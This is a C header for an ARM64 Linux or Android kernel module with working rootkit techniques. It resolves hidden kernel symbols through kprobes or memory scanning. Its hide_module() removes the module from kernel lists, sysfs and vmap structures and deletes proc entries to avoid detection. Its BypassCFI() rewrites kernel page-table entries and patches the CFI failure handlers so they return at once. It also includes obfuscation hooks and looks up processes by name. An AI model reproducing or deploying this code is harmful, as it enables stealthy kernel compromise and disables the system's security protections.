
#pragma GCC diagnostic ignored "-Wdeclaration-after-statement"

#ifndef __UTILS_H
#define __UTILS_H
#include <linux/capability.h>
#include <linux/cred.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/init.h>
#include <linux/init_task.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/lsm_hooks.h>
#include <linux/mm.h>
#include <linux/nsproxy.h>
#include <linux/path.h>
#include <linux/printk.h>
#include <linux/sched.h>
#include <linux/security.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/uidgid.h>
#include <linux/version.h>
#include <linux/mount.h>

#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>

#include <linux/list.h>
#include <linux/irqflags.h>
#include <linux/mm_types.h>
#include <linux/rcupdate.h>
#include <linux/vmalloc.h>

#include <linux/kallsyms.h>
#include <linux/spinlock.h>

#include <asm/tlbflush.h>

#include <asm/cacheflush.h>

#include <linux/anon_inodes.h>

#include "obfuscate.h"

#define logk(fmt, ...) printk("[TwT]: " fmt, ##__VA_ARGS__)

#define pte_valid_conts(pte)	(((pte) & (PTE_VALID | PTE_TABLE_BIT | PTE_CONT)) == (PTE_VALID | PTE_TABLE_BIT | PTE_CONT))

#define bits(n, high, low) (((n) << (63u - (high))) >> (63u - (high) + (low)))

struct file *(*filp_open_ptr)(const char *, int, umode_t) = NULL;

unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static __always_inline 
unsigned long my_kallsyms_lookup_name_legacy(const char *fname_raw)
{
	unsigned long kaddr;
	char *fname_lookup, *fname;

	fname_lookup = kmalloc(NAME_MAX, GFP_KERNEL);
	if (!fname_lookup)
		return 0;

	fname = kmalloc(strlen(fname_raw) + 4, GFP_KERNEL);
	if (!fname)
		return 0;

	strcpy(fname, fname_raw);
	strcat(fname, "+0x0");

	kaddr = (unsigned long)&sprint_symbol;
	kaddr &= 0xffffffffff000000;
	
	while (true)
	{
		sprint_symbol(fname_lookup, kaddr);
		if (strncmp(fname_lookup, fname, strlen(fname)) == 0)
		{
			break;
		}
		kaddr += 0x04;
	}
	kfree(fname_lookup);
	kfree(fname);
	logk("[%s]:%lx\n", fname_raw, kaddr);
	return kaddr;
}

__attribute__((no_sanitize("cfi")))  static __always_inline 
unsigned long my_kallsyms_lookup_name(const char *fname_raw)
{
    int ret;
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
    };
    
    if (!kallsyms_lookup_name_ptr) {
        if ((ret = register_kprobe(&kp))){
            logk("Failed to register kprobe: %d\n", ret);
            return my_kallsyms_lookup_name_legacy(fname_raw);
        }
        
        kallsyms_lookup_name_ptr = (typeof(kallsyms_lookup_name_ptr))kp.addr;
        unregister_kprobe(&kp);
        
        if (!kallsyms_lookup_name_ptr) {
            logk(" Kprobe failed to get kallsyms_lookup_name address\n");
            return my_kallsyms_lookup_name_legacy(fname_raw);
        }
    }
    
    return kallsyms_lookup_name_ptr(fname_raw);
}




/*
__attribute__((no_sanitize("cfi")))
unsigned long KALLSYMS_LOOKUP_NAME(const char * name)
{
	    unsigned long addr=0;
	    if(kallsyms_lookup_name_ptr==NULL){
	    kallsyms_lookup_name_ptr=(typeof(kallsyms_lookup_name_ptr))my_kallsyms_lookup_name("kallsyms_lookup_name");
	    }
		addr = (typeof(addr))kallsyms_lookup_name_ptr(name);
		if (!addr) {
			logk("Failed to find symbol\n");
		}
		return addr;
}
*/

__attribute__((no_sanitize("cfi")))
static __always_inline void hide_module(void)
{

	struct vmap_area *va, *vtmp;
	struct module_use *use, *tmp;
	struct list_head *_vmap_area_list;
	struct rb_root *_vmap_area_root;

	_vmap_area_list =(struct list_head *)kallsyms_lookup_name_ptr("vmap_area_list");
	_vmap_area_root = (struct rb_root *)kallsyms_lookup_name_ptr("vmap_area_root");

    if(filp_open_ptr==NULL)
	{
        filp_open_ptr = (typeof(filp_open_ptr))kallsyms_lookup_name_ptr("filp_open");
    }
    if (!IS_ERR(filp_open_ptr("/proc/sched_debug", O_RDONLY, 0))) {
        remove_proc_subtree("sched_debug", NULL);
    }
    if (!IS_ERR(filp_open_ptr("/proc/uevents_records", O_RDONLY, 0))) {
        remove_proc_entry("uevents_records", NULL);
    }
/*
    kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
*/
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
	

	list_for_each_entry_safe(va, vtmp, _vmap_area_list, list)
	{
		if ((unsigned long)THIS_MODULE > va->va_start &&
			(unsigned long)THIS_MODULE < va->va_end)
		{
			list_del(&va->list);
			rb_erase(&va->rb_node, _vmap_area_root);
		}
	}
	list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list)
	{
		list_del(&use->source_list);
		list_del(&use->target_list);
		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
		kfree(use);
	}
}

 __always_inline 
uint64_t *pgtable_entry(uint64_t pgd, uint64_t va)
{
    uint64_t tcr_el1;
    uint64_t t1sz;
    
    uint64_t pxd_bits = PAGE_SHIFT - 3;
    uint64_t pxd_ptrs = 1u << pxd_bits;
    uint64_t pxd_va = pgd;
    uint64_t pxd_pa = virt_to_phys((void*)pxd_va);
    uint64_t pxd_entry_va = 0;
    uint64_t block_lv = 0;
    int64_t lv = 0;
    
    asm volatile("mrs %0, tcr_el1" : "=r"(tcr_el1));
    t1sz = bits(tcr_el1, 21, 16);
    
    if(PAGE_SHIFT == 0 || (60 - t1sz) / (PAGE_SHIFT - 3) == 0 || PAGE_SHIFT == 0)
        return NULL;
    // ================
    // Branch to some function (even empty), It can work,
    // I don't know why, if anyone knows, please let me know. thank you very much.
    // ================
    //__flush_dcache_area((void *)pxd_va, PAGE_SIZE);

    for (lv = 4 - ((60 - t1sz) / (PAGE_SHIFT - 3)); lv < 4; lv++) {
		uint64_t pxd_desc;
        uint64_t pxd_shift = (PAGE_SHIFT - 3) * (4 - lv) + 3;
        uint64_t pxd_index = (va >> pxd_shift) & (pxd_ptrs - 1);
        pxd_entry_va = pxd_va + pxd_index * 8;
        if (!pxd_entry_va) return 0;
        pxd_desc = *((uint64_t *)pxd_entry_va);
        if ((pxd_desc & 0b11) == 0b11) { // table
            pxd_pa = pxd_desc & (((1ul << (48 - PAGE_SHIFT)) - 1) << PAGE_SHIFT);
        } else if ((pxd_desc & 0b11) == 0b01) { // block
            // 4k page: lv1, lv2. 16k and 64k page: only lv2.
            uint64_t block_bits = (3 - lv) * pxd_bits + PAGE_SHIFT;
            pxd_pa = pxd_desc & (((1ul << (48 - block_bits)) - 1) << block_bits);
            block_lv = lv;
        } else { // invalid
            return 0;
        }
        //
        pxd_va = (uint64_t)phys_to_virt((phys_addr_t)pxd_pa);
        if (block_lv) {
            break;
        }
    }

    return (uint64_t *)pxd_entry_va;
}
 __always_inline 
uint64_t *pgtable_entry_kernel(uint64_t va)
{
    uint64_t ttbr1_el1;
    uint64_t baddr;
    uint64_t pgd_k_pa;
    asm volatile("mrs %0, ttbr1_el1" : "=r"(ttbr1_el1));
    baddr = ttbr1_el1 & 0xFFFFFFFFFFFE;
    pgd_k_pa = baddr & ~(PAGE_SIZE - 1);
    return pgtable_entry((uint64_t)phys_to_virt(pgd_k_pa), va);
}

/*
static inline void flush_icache_all(void)
{
    asm volatile("dsb ish" : : : "memory");
    asm volatile("ic ialluis");
    asm volatile("dsb ish" : : : "memory");
    asm volatile("isb" : : : "memory");
}
*/ 

__always_inline 
void modify_entry_kernel(uint64_t va, uint64_t *entry, uint64_t value)
{
    if (!pte_valid_conts(*entry) && !pte_valid_conts(value)) {
        *entry = value;
        __flush_tlb_kernel_pgtable(va);
        return;
    }

    uint64_t table_pa_mask = (((1ul << (48 - PAGE_SHIFT)) - 1) << PAGE_SHIFT);
    uint64_t prot = value & ~table_pa_mask;
    uint64_t *p = (uint64_t *)((uintptr_t)entry & ~(sizeof(entry) * CONT_PTES - 1));
	int i;
    for (i = 0; i < CONT_PTES; ++i, ++p)
        *p = (*p & table_pa_mask) | prot;

    *entry = value;
    va &= CONT_PTE_MASK;
    flush_tlb_kernel_range(va, va + CONT_PTES * PAGE_SIZE);
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 1, 0)
__attribute__((no_sanitize("cfi")))static __always_inline 
void BypassCFI(void) {
    uint64_t cfiaddr = 0;
    uint64_t *entry;
    uint64_t ori_prot;
    
    cfiaddr = kallsyms_lookup_name_ptr("__cfi_check_fail");
    if (cfiaddr) {
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        flush_tlb_all();
        
        *((uint32_t*)cfiaddr) = 0xD65F03C0;//RET
        flush_icache_range(cfiaddr, cfiaddr + 0x4);
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        flush_tlb_all();
        
    }
    
    cfiaddr = kallsyms_lookup_name_ptr("__cfi_slowpath");
    if (cfiaddr) {
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        flush_tlb_all();
        
        *((uint32_t*)cfiaddr) = 0xD65F03C0;//RET
        flush_icache_range(cfiaddr, cfiaddr + 0x4);
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        flush_tlb_all();
        
    }
    
    cfiaddr = kallsyms_lookup_name_ptr("__cfi_slowpath_diag");
    if (cfiaddr) {
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        flush_tlb_all();
        
        *((uint32_t*)cfiaddr) = 0xD65F03C0;//RET
        flush_icache_range(cfiaddr, cfiaddr + 0x4);
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        flush_tlb_all();
        
    }
    
    
    cfiaddr = kallsyms_lookup_name_ptr("__ubsan_handle_cfi_check_fail");
    if (cfiaddr) {
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        flush_tlb_all();
        
        *((uint32_t*)cfiaddr) = 0xD65F03C0;//RET
        flush_icache_range(cfiaddr, cfiaddr + 0x4);
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        flush_tlb_all();
        
    }
    
    cfiaddr = kallsyms_lookup_name_ptr("__ubsan_handle_cfi_check_fail_abort");
    if (cfiaddr) {
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        flush_tlb_all();
        
        *((uint32_t*)cfiaddr) = 0xD65F03C0;//RET
        flush_icache_range(cfiaddr, cfiaddr + 0x4);
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        flush_tlb_all();
        
    }
    
    cfiaddr = kallsyms_lookup_name_ptr("report_cfi_failure");
        if(cfiaddr){
        entry = pgtable_entry_kernel(cfiaddr);
        ori_prot = *entry;
        modify_entry_kernel(cfiaddr, entry, (ori_prot | PTE_DBM) & ~PTE_RDONLY);
        dsb(ishst);
        flush_tlb_kernel_range(cfiaddr, cfiaddr + PAGE_SIZE);
        dsb(ish);
        isb();
        
        if(*(uint32_t*)cfiaddr == 0xD503233F/*PACIASP*/){
        cfiaddr += 4;
        *((uint32_t*)cfiaddr)     = 0x52800020;//MOV w0, #1
        *((uint32_t*)(cfiaddr+0x4)) = 0xD50323BF;//AUTIASP
        *((uint32_t*)(cfiaddr+0x8)) = 0xD65F03C0;//RET
        dsb(ish);
        flush_icache_range(cfiaddr, cfiaddr + 0x12);
        dsb(ish);
        isb();
        }
        else
        {
        *((uint32_t*)cfiaddr)     = 0x52800020;//MOV w0, #1
        *((uint32_t*)(cfiaddr+0x4)) = 0xD65F03C0;//RET
        dsb(ish);
        flush_icache_range(cfiaddr, cfiaddr + 0x8);
        dsb(ish);
        isb();
        }
        
        modify_entry_kernel(cfiaddr, entry, ori_prot);
        dsb(ishst);
        flush_tlb_kernel_range(cfiaddr, cfiaddr + PAGE_SIZE);
        dsb(ish);
        isb();
    }
    
    logk("BypassCFI Success!\n");
}
#endif


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 4, 10)
__attribute__((__annotate__(("nosub nofco strenc nobcf nofla nosub"))))
struct task_struct *my_find_get_task_by_vpid(pid_t nr)
{
	struct task_struct *task;

	rcu_read_lock();
	task = find_task_by_vpid(nr);
	rcu_read_unlock();
	return task;
}
#else
__attribute__((__annotate__(("nosub nofco strenc nobcf nofla nosub"))))
struct task_struct *my_find_get_task_by_vpid(pid_t nr)
{
	struct pid *pb_pid = NULL;
	struct task_struct *task = NULL;
	pb_pid = find_get_pid(nr);
	if (pb_pid)
	{
		put_pid(pb_pid);
		task = get_pid_task(pb_pid, PIDTYPE_PID);
		if (task)
			put_task_struct(task);
	}
	return task;
}
#endif

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 1, 0))

static int (*my_get_cmdline)(struct task_struct *task, char *buffer, int buflen) = NULL;

__attribute__((no_sanitize("cfi")))
pid_t get_process_pid(char *name)
{
	char cmdline[256];
	char comm[16];
	struct task_struct *task;
	size_t name_len;
	int ret;
	name_len = strlen(name);
	if (name_len == 0)
	{
		return -2;
	}
	if (my_get_cmdline == NULL)
	{
		my_get_cmdline = (void *)kallsyms_lookup_name_ptr("get_cmdline");
	}
	rcu_read_lock();
	for_each_process(task)
	{
		if (task->mm == NULL)
		{
			continue;
		}
		cmdline[0] = '\0';
		if (my_get_cmdline != NULL)
		{
			ret = my_get_cmdline(task, cmdline, sizeof(cmdline));
		}
		else
		{
			ret = -1;
		}
		if (ret < 0)
		{
			get_task_comm(comm, task);
			if (strncmp(comm, name, min(strlen(task->comm), name_len)) == 0)
			{
				rcu_read_unlock();
				return task->pid;
			}
		}
		else
		{
			if (strncmp(cmdline, name, min(name_len, strlen(cmdline))) == 0)
			{
				rcu_read_unlock();
				return task->pid;
			}
		}
	}
	rcu_read_unlock();
	return 0;
}
#else
pid_t get_process_pid(char *name)
{
    pid_t ipid = -1;
    pid_t pid;
    struct task_struct *task = NULL;
    char comm[TASK_COMM_LEN];
    	
    for (pid = 0; pid < 32768; pid++)
    {
        task = my_find_get_task_by_vpid(pid);
        if (!task)
        {
            continue;
        }

        get_task_comm(comm, task);
        //logk("pid=%d comm=%s\n", pid,comm);
        if (strstr(comm, name))
        {
            ipid = pid;
            break;
        }
    }
    return ipid;
}
#endif

#endif // __UTILS_H

